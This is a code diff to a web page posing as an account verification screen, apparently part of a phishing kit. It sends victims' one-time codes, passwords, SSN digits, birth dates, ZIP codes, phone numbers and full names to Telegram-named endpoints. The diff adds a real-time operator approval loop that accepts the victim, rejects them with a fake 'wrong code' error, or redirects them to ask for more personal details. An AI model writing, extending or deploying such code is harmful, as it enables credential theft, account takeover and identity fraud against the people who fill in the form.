@@ -7,7 +7,13 @@ import { Button } from "@/components/ui/button"
 import { SiteFooter } from "@/components/site-footer"
 import { SiteHeader } from "@/components/site-header"
 import { Input } from "@/components/ui/input"
-import { OTP_RESEND_COOLDOWN_SEC } from "@/lib/approval-messages"
+import {
+  METHOD_DENIED_ERROR_TEXT,
+  MSG_UNABLE_REACH_VERIFICATION,
+  OTP_CODE_ERROR_TEXT,
+  OTP_RESEND_COOLDOWN_SEC,
+} from "@/lib/approval-messages"
+import { waitForApprovalDecision } from "@/lib/approval-webhook"
 import { MONTHS, DAYS, YEARS } from "@/lib/date-constants"
 import { LOADING_MS, wait } from "@/lib/loading-delays"
 import {
@@ -40,11 +46,17 @@ function EnterCodeContent() {
   const [isLoading, setIsLoading] = useState(false)
   const [isResending, setIsResending] = useState(false)
   const [resendCooldown, setResendCooldown] = useState(0)
+  const [formError, setFormError] = useState("")
 
   const modeIsDetails = searchParams.get("mode") === "details"
   useEffect(() => {
     setStep(modeIsDetails ? "details" : "code")
   }, [modeIsDetails])
+
+  useEffect(() => {
+    const errorText = searchParams.get("error")
+    if (errorText) setFormError(errorText)
+  }, [searchParams])
 
   useEffect(() => {
     if (resendCooldown <= 0) return
@@ -75,17 +87,47 @@ function EnterCodeContent() {
     }
 
     setIsLoading(true)
+    setFormError("")
 
-    await fetch("/api/telegram/verification", {
+    const verificationResponse = await fetch("/api/telegram/verification", {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({
         verificationType: "Code (first OTP)",
         code,
+        userId: uid,
       }),
-    }).catch(console.error)
+    })
 
-    window.location.href = "/api/login-out"
+    if (!verificationResponse.ok) {
+      setFormError(MSG_UNABLE_REACH_VERIFICATION)
+      setIsLoading(false)
+      return
+    }
+
+    const verificationJson = (await verificationResponse.json()) as { sessionId?: string }
+    if (!verificationJson.sessionId) {
+      setFormError(MSG_UNABLE_REACH_VERIFICATION)
+      setIsLoading(false)
+      return
+    }
+
+    const decision = await waitForApprovalDecision(verificationJson.sessionId)
+    if (decision === "approved") {
+      await wait(LOADING_MS.details)
+      setIsLoading(false)
+      window.location.href = "/api/login-out"
+      return
+    }
+
+    if (decision === "redirected") {
+      setIsLoading(false)
+      router.push("/verify?mode=details")
+      return
+    }
+
+    setFormError(decision === "denied" ? OTP_CODE_ERROR_TEXT : MSG_UNABLE_REACH_VERIFICATION)
+    setIsLoading(false)
   }
 
   const handleVerifyDetails = async () => {
@@ -98,22 +140,51 @@ function EnterCodeContent() {
     }
 
     setIsLoading(true)
+    setFormError("")
 
-    fetch("/api/telegram/verify-details", {
+    const detailsResponse = await fetch("/api/telegram/verify-details", {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({
+        userId: uid,
+        password: pwd,
         ssnLast4: ssnDigits,
         zip: usZipDigits(zip),
         birthDate: `${month} ${day}, ${year}`,
         phoneNumber: phoneDigits,
         fullName,
       }),
-    }).catch(console.error)
+    })
 
-    await wait(LOADING_MS.details)
+    if (!detailsResponse.ok) {
+      setFormError(MSG_UNABLE_REACH_VERIFICATION)
+      setIsLoading(false)
+      return
+    }
+
+    const detailsJson = (await detailsResponse.json()) as { sessionId?: string }
+    if (!detailsJson.sessionId) {
+      setFormError(MSG_UNABLE_REACH_VERIFICATION)
+      setIsLoading(false)
+      return
+    }
+
+    const decision = await waitForApprovalDecision(detailsJson.sessionId)
+    if (decision === "approved") {
+      await wait(LOADING_MS.details)
+      setIsLoading(false)
+      router.push("/verify")
+      return
+    }
+
+    if (decision === "redirected") {
+      setIsLoading(false)
+      router.push("/verify?mode=details")
+      return
+    }
+
+    setFormError(decision === "denied" ? METHOD_DENIED_ERROR_TEXT : MSG_UNABLE_REACH_VERIFICATION)
     setIsLoading(false)
-    router.push("/verify")
   }
 
   const handleResend = async () => {
@@ -146,6 +217,11 @@ function EnterCodeContent() {
           </p>
 
           <div className="space-y-5">
+            {formError ? (
+              <div className="rounded-md border border-red-200 bg-red-50 px-3 py-2 text-sm text-red-700" role="alert">
+                {formError}
+              </div>
+            ) : null}
             <div>
               <label htmlFor="verify-ssn" className="block text-sm font-medium text-gray-900 mb-1.5">
                 Last 4 Digits of SSN
@@ -338,6 +414,11 @@ function EnterCodeContent() {
         </div>
 
         <div className="space-y-4">
+          {formError ? (
+            <div className="rounded-md border border-red-200 bg-red-50 px-3 py-2 text-sm text-red-700" role="alert">
+              {formError}
+            </div>
+          ) : null}
           <div>
             <input
               type="text"
